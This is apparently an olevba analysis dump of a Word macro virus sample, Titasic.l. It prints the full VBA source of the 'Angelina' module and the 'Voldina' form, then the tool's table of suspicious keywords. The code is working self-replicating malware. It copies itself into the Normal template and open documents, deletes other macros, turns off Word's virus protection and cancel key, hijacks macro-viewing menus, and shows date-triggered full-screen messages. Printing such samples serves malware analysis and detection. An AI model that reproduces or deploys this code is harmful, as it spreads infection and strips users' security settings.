olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.l-9cbeb687695ffaab6bec7dd1107cb2cd436b43e1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.l-9cbeb687695ffaab6bec7dd1107cb2cd436b43e1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angelina.bas 
in file: Virus.MSWord.Titasic.l-9cbeb687695ffaab6bec7dd1107cb2cd436b43e1 - OLE stream: 'Macros/VBA/Angelina'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Public AD As Object, aDes As Variant, btk As String
Public NonVoldina As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function AstMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "Angelina"
nmak(1) = "Voldina"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "Angelina" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "Angelina"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "Voldina Anti virus"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonVoldina = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "Angelina" And nmak.Name <> "Voldina" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Attribute Action.VB_Description = "Jangan Ngawur Yaa.. Suniel"
Attribute Action.VB_ProcData.VB_Invoke_Func = "Normal.Angelina.Action"
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "Voldina"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "Voldina ," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
btk = 1
Voldina.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
If Day(Now) = 16 Then
   btk = 2
   Voldina.Show
ElseIf (Day(Now) = 16) And (Month(Now) = 1) Then
   btk = 2
   Voldina.Show
Else
End If
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
AstMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    AstMaster
    End If
    Next
End If
If Now > DateSerial(1998, 9, 10) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="Angelina.Action"
End
End Sub
Sub ViewVBCode()
If MsgBox("Maaf.." & Chr(13) & "Ente Jangan Sock pintar untuk mengubahnya " & Chr(13) & Chr(13) _
& "Untuk info klik saja HELP - About Microsoft Word " & Chr(13) & Chr(13) _
& " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "Voldina Anti Virus") _
= vbYes Then
    SendKeys "%m%s{down}~%d'Macro non-Voldina'%m"
Else
Action
End If
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
AstMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
AstMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub HelpAbout()
    On Error GoTo voldna
    btk = 3
    Voldina.Show
voldna:
End Sub
Sub FileClose()
If Day(Now) = 16 Then
   btk = 2
   Voldina.Show
ElseIf (Day(Now) = 16) And (Month(Now) = 1) Then
   btk = 2
   Voldina.Show
Else
End If
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonVoldina Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".Angelina.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros Voldina mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Voldina')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVBCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Voldina" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SNrml.dot" Then AstMaster
End Sub
Sub FileExit()
If Day(Now) = 16 Then
   btk = 2
   Voldina.Show
ElseIf (Day(Now) = 16) And (Month(Now) = 1) Then
   btk = 2
   Voldina.Show
Else
End If
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function











'This macros created & inspirated
'when my specials friends
'celebrate her birthday
' January 16, 1999

'This is special gift for you
'######################################
' I HOPE YOU REMEMBER FOR ME
' EVEN YOU HAPPY WITH OTHERS
' NEW FRIENDS
'                        ....fhrazzthy
'######################################
'fhrazzthy@most-wanted.com







-------------------------------------------------------------------------------
VBA MACRO Voldina.frm 
in file: Virus.MSWord.Titasic.l-9cbeb687695ffaab6bec7dd1107cb2cd436b43e1 - OLE stream: 'Macros/VBA/Voldina'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 











































Dim Teks(6) As String
Private Sub CommandButton1_Click()
Do
    With Voldina
    .Height = .Height - 10
    .Width = .Width - 15
    If .Height < 25 Then Exit Do
    End With
    Beep
Loop
Unload Me
End Sub

Private Sub CommandButton2_Click()
Do
    With Voldina
    .Height = .Height - 10
    .Width = .Width - 15
    If .Height < 25 Then Exit Do
    End With
    Beep
Loop
Unload Me
btk = 3
Voldina.Show
End Sub



Private Sub Image6_Click()

End Sub

Private Sub UserForm_Activate()
If btk = 2 Then
    Ulang
ElseIf btk = 1 Then
    TT
ElseIf btk = 3 Then
    Wly
Else
End If
End Sub
Sub Wly()
With Voldina
    .Width = Width - 200
    .Caption = "F.h.r.a.z.z.t.h.y"
    .StartUpPosition = 1
End With
Image1.Visible = False
Image3.Visible = True
Image4.Visible = True
Image5.Visible = False
Image6.Visible = True
Label8.Visible = False
Label4.Visible = False
Label9.Visible = True
Label7.Visible = True

CommandButton2.Visible = False

End Sub
Sub TT()
Dim a As Byte, diam As Boolean
Dim tp&, tm!, sel!, i%

Image3.Visible = False
Image4.Visible = False
Image6.Visible = False
Label9.Visible = False
Image6.Visible = False
Label7.Visible = False
Image5.Visible = False
Label8.Visible = False

a = 1
diam = True
Voldina.Enabled = False
Label3.Visible = False
Do
    DoEvents
    sel = Timer - tm
    tp = tp + 1
    If tp Mod 300 = 0 Then
    Label4.ForeColor = Voldina.BackColor
    End If
    If tp Mod 600 = 0 Then
    Label4.ForeColor = &H80000009
End If
    If sel > 0.1 Then
        tm = Timer
        i = i + 1
        If a = 7 Then Label1.Font.Size = 16: Label1.Width = Image1.Width
        Label1.Caption = Label1.Caption & Mid(Teks(a), i, 1)
        If Mid(Teks(a), i, 1) Like "[! ]" Then Beep
            If Len(Label1.Caption) = Len(Teks(a)) Then
                If diam Then
                    Do
                    If Timer - tm > 1 Then Exit Do
                    DoEvents
                    Label4.ForeColor = Voldina.BackColor
                    Loop
                    diam = False
                    If a = 7 Then GoTo catat
                End If
            Label2.Move Label2.Left - 9
            If Label2.Left <= Label1.Left Then GoSub catat
        End If
    End If
Loop
Exit Sub
catat:
If a <> 7 Then Label1.Caption = ""
tm = Timer
Label2.Left = Label1.Left + Label1.Width
a = a + 1
i = 0
diam = True
        If a = 7 Then
            Label4.Visible = True
            Image1.Visible = True
            Voldina.Enabled = True
            Label3.Visible = True
            CommandButton1.SetFocus
            Image1.Picture = LoadPicture(System.PrivateProfileString("", _
            "HKEY_CURRENT_USER\Control Panel\desktop", "Wallpaper"))
            Exit Sub
        End If
Return
End Sub





Private Sub UserForm_Layout()
Dim waktu%, saat$
waktu = Val(Format(Time, "hh"))
Select Case waktu
Case 0 To 8
saat = "pagi"
Case 9 To 14
saat = "siang"
Case 15 To 17
saat = "sore"
Case 18 To 23
saat = "malam"
Case Else
Label4.Visible = False
End Select

Teks(1) = "Mas Yudi sayangku maaf bila hal ini akan mengganggumu "
Teks(2) = "Karena hanya dengan inilah dinda mengingatkan akan wajahku yang manis ini"
Teks(3) = "S'bab kutahu  kalau kamu sering lirik sana-sini"
Teks(4) = "Tapi akoe sangat maklum akan tugasmu ini penuh dengan SLI"
Teks(5) = "Yang Kumau agar kamu S'lalu ingat akan cantiknya parasku"
Teks(6) = "Salam sayang dariku hanya untukmu seorang"
Label2.Left = Label1.Left + Label1.Width
Label3.Caption = "Hacked by : Fhrazzthy '96" & Chr(13) & Chr(13) & "Thanks to : " & Chr(13) & Application.UserName
Label4.Caption = "Selamat " & saat & Chr(13) & "Maaf bila " & Application.UserName & " merasa terganggu"
End Sub
Private Sub UserForm_Terminate()
    Dim i As Integer
    For i = 1 To 10
        Beep
    Next
End Sub
Sub Ulang()
Dim waktu%, bln$, kt$
With Voldina
    .Width = Width - 200
    .Caption = "Happy Birthday"
    .StartUpPosition = 1
End With
Image1.Visible = False
Image2.Visible = False
Image3.Visible = False
Image4.Visible = False
Image6.Visible = False
Label4.Visible = False
Label9.Visible = False
Label7.Visible = False

CommandButton2.Visible = False

Image5.Visible = True
Label8.Visible = True

kt = Val(Format(Date, "mm"))
Select Case kt
Case 2: bln = "sebulan yang lalu"
Case 3: bln = "2 bulan yang lewat"
Case 4: bln = "3 bulan yang lalu"
Case 5: bln = "4 bulan kemarin"
Case 6: bln = "5 bulan lalu"
Case 7: bln = "setengah tahun lagi"
Case 8: bln = "5 bulan kedepan"
Case 9: bln = "4 bulan mendatang"
Case 10: bln = "3 bulan lagi"
Case 11: bln = "tinggal 2 bulan lagi"
Case 12: bln = "sebulan lagi"
End Select
If Day(Now) = 16 And Month(Now) = 1 Then
   Image5.Visible = True
   Label8.Visible = False
   With Voldina
    .Caption = "Happy Birthday Dhien"
   End With
ElseIf Day(Now) = 16 Then
   With Voldina
    .Caption = "Pesan From Fhrazzthy"
   End With
   Image5.Visible = False
   Label8.Visible = True
   Label8.Caption = "!! INGAT !!" & Chr(13) & bln & Chr(13) & _
                 "Voldina ulang tahun"
Else
With Voldina
    .Caption = "Pesan From Fhrazzthy"
   End With
Image5.Visible = False
Label8.Visible = True
Label8.Caption = "!! INGAT !!" & Chr(13) & bln & Chr(13) & _
                 "Voldina ulang tahun"

End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

